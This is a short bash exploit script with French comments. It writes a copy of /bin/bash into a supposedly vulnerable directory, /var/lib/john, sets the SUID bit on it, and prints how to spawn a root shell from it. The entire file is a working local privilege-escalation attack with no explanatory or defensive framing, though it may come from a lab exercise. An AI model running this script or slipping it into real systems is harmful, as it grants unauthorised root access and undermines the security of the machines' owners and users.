#!/usr/bin/env bash
# exploit.sh — écrase un fichier au nom unique dans /var/lib/john pour SUID bash

set -euo pipefail

# 1) Pré-vérification
./pre_check.sh

# 2) Choix d’un nom unique dans le répertoire vulnérable
DIR="/var/lib/john"
NAME=$(uuidgen)
PAYLOAD="$DIR/$NAME"

# 3) Copie de /bin/bash et mise en SUID
cp /bin/bash "$PAYLOAD"
chmod 4755 "$PAYLOAD"

# 4) Affichage
echo "[+] SUID shell written to $PAYLOAD"
echo "[+] Get root with: $PAYLOAD -p"
